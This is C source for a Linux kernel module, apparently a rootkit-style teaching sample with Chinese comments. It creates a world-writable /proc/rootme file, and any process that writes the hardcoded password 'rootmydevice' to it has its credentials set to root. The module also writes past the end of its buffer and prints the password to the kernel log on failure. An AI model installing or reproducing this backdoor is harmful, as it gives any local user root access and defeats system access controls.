//
// Created by root on 5/3/17.
// usage: echo AUTH > /proc/NAME
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/fs.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/sched.h>

#define AUTH "rootmydevice"
#define NAME "rootme"

ssize_t write_handler(struct file * filp, const char __user *buff,size_t count, loff_t *offp);

struct file_operations proc_fops = {
        .write = write_handler
};

ssize_t write_handler(struct file * filp, const char __user *buff,
                    size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    printk(KERN_EMERG "buff is %s\n", buff);
    printk(KERN_EMERG "count is %d\n", count);
    // 分配内存。
    kbuff = kmalloc(count, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    // 复制到内核缓冲区。
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
    strncmp(AUTH, kbuff, count) == 0) {

    // 用户进程写入的内容是我们的口令或者密码，
    // 把进程的 ``uid`` 与 ``gid`` 等等
    // 都设置成 ``root`` 账号的，将其提权到 ``root``。
    printk(KERN_EMERG "%s\n", "Comrade, I will help you.");
    cred = (struct cred *)__task_cred(current);
    cred->uid = cred->euid = cred->fsuid = 0;
    cred->gid = cred->egid = cred->fsgid = 0;
    printk(KERN_EMERG "%s\n", "See you!");
    } else {
// 密码错误，拒绝提权。
    printk(KERN_EMERG "Alien, AUTH IS: %s.\n", AUTH);
    printk(KERN_EMERG "Alien, get out of here: %s.\n", kbuff);
    }

    //kfree(buff);   //不需要这句代码，会造成系统崩溃
    return count;
}

MODULE_LICENSE("Dual BSD/GPL");
struct proc_dir_entry *entry;

static int hook_init(void)
{
    printk(KERN_EMERG "Hello, HOOK\n");
    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
    return 0;
}

static void hook_exit(void)
{
    remove_proc_entry(NAME,NULL);   //使用remove_proc_entry 代替 proc_remove
    printk(KERN_INFO "Goodbye world!\n");
}
module_init(hook_init);
module_exit(hook_exit);

